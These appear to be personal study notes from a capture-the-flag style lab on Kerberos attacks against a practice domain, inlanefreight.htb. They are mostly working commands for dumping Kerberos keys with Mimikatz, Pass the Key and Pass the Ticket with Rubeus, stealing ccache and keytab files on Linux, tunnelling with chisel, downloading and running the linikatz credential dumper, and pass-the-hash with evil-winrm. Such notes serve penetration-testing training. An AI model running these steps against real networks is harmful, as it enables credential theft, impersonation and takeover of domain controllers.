# Instead of mimikatz
Rubeus.exe dump /nowrap

# Mimikatz - Extract Kerberos Keys 
privilege::debug
sekurlsa::ekeys

# Now that we have access to the AES256_HMAC and RC4_HMAC keys, we can perform the OverPass the Hash or Pass the Key attack using Mimikatz and Rubeus

# Mimikatz - Pass the Key or OverPass the Hash
privilege::debug
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

# Rubeus - Pass the Key or OverPass the Hash
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

# Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

```

### Pass the Ticket (PtT)
```bash
# Rubeus Pass the Ticket
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt

# Rubeus - Pass the Ticket
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

### Convert .kirbi to Base64 Format
`PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))`

### Pass the Ticket - Base64 Format
`c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>`

Finally, we can also perform the Pass the Ticket attack using the Mimikatz module kerberos::ptt and the .kirbi file that contains the ticket we want to import.

### Mimikatz - Pass the Ticket
```bash
privilege::debug

mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
c:\tools> dir \\DC01.inlanefreight.htb\c$
```

### Mimikatz - PowerShell Remoting with Pass the Ticket
```
privilege::debug
mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
c:\tools>powershell
PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
```

### Rubeus - PowerShell Remoting with Pass the Ticket
Rubeus has the option createnetonly, which creates a sacrificial process/logon session (Logon type 9). The process is hidden by default, but we can specify the flag /show to display the process, and the result is the equivalent of runas /netonly. This prevents the erasure of existing TGTs for the current logon session.

Create a Sacrificial Process with Rubeus
`C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show`

### Rubeus - Pass the Ticket for Lateral Movement
`C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt`
`c:\tools>powershell`
`PS C:\tools> Enter-PSSession -ComputerName DC01`
```
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
```

# Pass the Tickent (PtT) from Linux
`Linux Auth from MS01 image`: `<name>@<domain>@<IP>` : `david@inlenefreight.htb@<IP>`

### Linux Auth port forwarding:
`ssh david@inlanefreight.htb@10.129.204.23 -p 2222`

### realm - Check If Linux Machine is Domain Joined
```bash
realm list

# PS - Check if Linux Machine is Domain Joined
ps -ef | grep -i "winbind\|sssd"

# Using Find to Search for Files with Keytab in the Name
find / -name *keytab* -ls 2>/dev/null

# Identifying Keytab Files in Cronjobs
crontab -l


```

Note: As we discussed in the Pass the Ticket from Windows section, a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain joined machine needs a ticket. The ticket is represented as a keytab file located by default at /etc/krb5.keytab and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB

### Finding ccached Files
`env | grep -i krb5`

As mentioned previously, ccache files are located, by default, at /tmp. We can search for users who are logged on to the computer, and if we gain access as root or a privileged user, we would be able to impersonate a user using their ccache file while it is still valid.

`ls -la /tmp | grep -ni krb`

### Listing keytab File Information
`klist -k -t`

### Impersonating a User with a keytab
`klist `
`kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab`
We can attempt to access the shared folder \\dc01\carlos to confirm our access.
`smbclient //dc01/carlos -k -c ls`

### Extracting Keytab Hashes with KeyTabExtract
`python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab`

For NTLM hashes, we can use [crackstation](https://crackstation.net/)

### Login as carlos:
`su - carlos@inlanefreight.htb`

To abuse a ccache file, all we need is read privileges on the file. These files, located in /tmp, can only be read by the user who created them, but if we gain root access, we could use them.

Once we log in with the credentials for the user svc_workstations, we can use sudo -l and confirm that the user can execute any command as root. We can use the sudo su command to change the user to root.

`ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222`
`sudo -l`
`ls -la /tmp`

### Identifying Group Membership with the id Command
`id julio@inlanefreight.htb`

### Importing the ccache File into our Current Session
```bash
klist
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist
smbclient //dc01/C$ -k -c ls -no-pass

```

### Using Linux Attack Tools with Kerberos
To use Kerberos, we need to proxy our traffic via `MS01` with a tool such as `Chisel` and `Proxychains` and edit the `/etc/hosts` file to hardcode IP addresses of the domain and the machines we want to attack.

`cat /etc/hosts`
We need to modify our proxychains configuration file to use socks5 and port 1080.
`cat /etc/proxychains.conf`

```bash
# Download and use chisel
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse
```

Connect to MS01 via RDP and execute chisel (located in C:\Tools).
`xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution`

Execute chisel:
`C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks`
Note: The client IP is your attack host IP.

### Setting the KRB5CCNAME Environment Variable
`export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133`

### Impacket

To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option -k. If we get a prompt for a password, we can also include the option `-no-pass`

Using Impacket with proxychains and Kerberos Authentication
`proxychains impacket-wmiexec dc01 -k`
Note: If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.

Installing Kerberos Authentication Package
`sudo apt-get install krb5-user -y`

In case the package krb5-user is already installed, we need to change the configuration file /etc/krb5.conf to include the following values:
Kerberos Configuration File for INLANEFREIGHT.HTB
```bash

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

<SNIP>
```

Now we can use evil-winrm.

### Using Evil-WinRM with Kerberos
`proxychains evil-winrm -i dc01 -r inlanefreight.htb`


If we want to use a ccache file in Windows or a kirbi file in a Linux machine, we can use impacket-ticketConverter to convert them. To use it, we specify the file we want to convert and the output filename. Let's convert Julio's ccache file to kirbi.

`impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi`

### Importing Converted Ticket into Windows Session with Rubeus
`C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi`
`dir \\dc01\julio`

### Linikatz is a similar tool as mimikats but for UNIX environments
Just like Mimikatz, to take advantage of Linikatz, we need to be root on the machine. This tool will extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. Once it extracts the credentials, it places them in a folder whose name starts with linikatz.. Inside this folder, you will find the credentials in the different available formats, including ccache and keytabs. These can be used, as appropriate, as explained above.

`wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh`
`/opt/linikatz.sh`


# Hard lab writeup
`use crowbar to brute force rdp`
assume you can extract an hash from everything

We can use john to extract vhd hashes:
```bash
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
cat backup.hash
```

how to mount bitlocker protected drive:
[tutorial](https://medium.com/@kartik.sharma522/mounting-bit-locker-encrypted-vhd-files-in-linux-4b3f543251f0)

Then pass the hash 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:`e53d4d912d96874e83429886c7bf22a1`:::
`evil-winrm -i 10.129.248.152 -u Administrator -H "e53d4d912d96874e83429886c7bf22a1"`